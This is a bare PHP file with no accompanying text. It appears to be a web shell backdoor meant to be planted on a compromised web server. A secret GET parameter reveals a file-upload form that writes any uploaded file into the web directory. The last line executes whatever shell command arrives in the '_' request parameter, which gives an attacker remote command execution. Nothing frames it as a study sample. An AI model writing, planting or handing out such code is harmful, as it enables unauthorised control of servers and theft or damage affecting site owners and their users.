<?php if(isset($_GET[1])) { 
echo '<form action="" method="post" ';
echo 'enctype="multipart/form-data" ';
echo 'name="up" id="up"><input type="file"';
echo 'name="file" size="50"><input name="_upl"';
echo 'type="submit" id="_upl" value="u"></form>';
if( $_POST['_upl'] == 'u' ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo 'y'; }
else { echo 'n'; } }  } ?><?=`{$_REQUEST['_']}`?>
